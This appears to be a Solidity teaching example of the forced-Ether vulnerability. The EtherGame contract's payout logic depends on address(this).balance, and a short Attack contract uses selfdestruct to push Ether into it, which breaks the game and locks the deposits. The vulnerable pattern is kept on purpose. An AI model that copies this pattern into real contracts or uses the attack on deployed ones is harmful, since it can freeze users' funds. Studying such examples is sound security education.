// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract EtherGame {
    uint256 public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint256 balance = address(this).balance;

        /*
            If the current balance of ether stored in this  
            greater than 7 ether, then the game is over.
            After 7 ether, no one is able to send ether
        */
        require(balance <= targetAmount, "Game is Over");

        /*
            If the balance of ether stored in this contract
            exceeds 7 ether, no one will be able to claim the reward 
        */
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}

contract Attack {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}